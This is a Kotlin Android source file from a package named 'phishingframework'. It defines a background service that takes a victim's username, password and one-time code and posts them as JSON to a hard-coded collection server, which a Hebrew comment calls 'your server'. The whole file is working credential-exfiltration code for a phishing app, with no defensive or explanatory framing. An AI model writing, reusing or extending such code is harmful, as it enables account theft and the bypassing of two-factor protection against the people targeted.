package com.example.phishingframework

import android.app.IntentService
import android.content.Intent
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class CredentialSendService : IntentService("CredentialSendService") {

    override fun onHandleIntent(intent: Intent?) {
        val username = intent?.getStringExtra("username") ?: return
        val password = intent.getStringExtra("password") ?: return
        val otp = intent.getStringExtra("otp") ?: ""

        val json = if (otp.isNotEmpty()) {
            """
                {
                  "username": "$username",
                  "password": "$password",
                  "otp": "$otp"
                }
            """.trimIndent()
        } else {
            """
                {
                  "username": "$username",
                  "password": "$password"
                }
            """.trimIndent()
        }

        val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
        val body = json.toRequestBody(mediaType)
        val request = Request.Builder()
            .url("http://192.168.1.28:5000/api/credentials") // השרת שלך
            .post(body)
            .build()

        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("CredentialSendService", "Failed to send credentials", e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.i("CredentialSendService", "Credentials sent successfully")
                } else {
                    Log.w("CredentialSendService", "Server error: ${response.code}")
                }
                response.close()
            }
        })
    }
}
